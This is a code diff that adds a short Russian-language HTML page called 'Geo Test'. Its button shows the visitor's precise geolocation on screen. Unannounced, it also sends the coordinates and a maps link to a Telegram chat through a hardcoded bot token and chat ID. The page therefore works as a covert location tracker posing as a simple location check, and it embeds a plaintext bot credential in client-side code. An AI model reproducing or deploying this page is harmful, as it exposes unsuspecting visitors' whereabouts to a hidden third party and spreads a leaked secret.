@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Geo Test</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family: Arial; padding: 20px;">
+
+<h2>Определение местоположения</h2>
+<button id="btn">Определить моё местоположение</button>
+
+<pre id="out"></pre>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8534876598:AAFKtzq7x4ZtuOIW12GnNNyS__ABz1Y7xqw";
+const TELEGRAM_CHAT_ID = "-1003612667914";
+
+document.getElementById('btn').onclick = () => {
+  const out = document.getElementById('out');
+  out.textContent = 'Запрос геолокации...';
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+
+      const text =
+        `📍 Геолокация\n` +
+        `Широта: ${lat}\n` +
+        `Долгота: ${lon}\n` +
+        `Точность: ${acc} м\n` +
+        `https://maps.google.com/?q=${lat},${lon}`;
+
+      out.textContent = text;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text
+        })
+      });
+    },
+    err => {
+      out.textContent = 'Ошибка: ' + err.message;
+    },
+    { enableHighAccuracy: true }
+  );
+};
+</script>
+
+</body>
+</html>
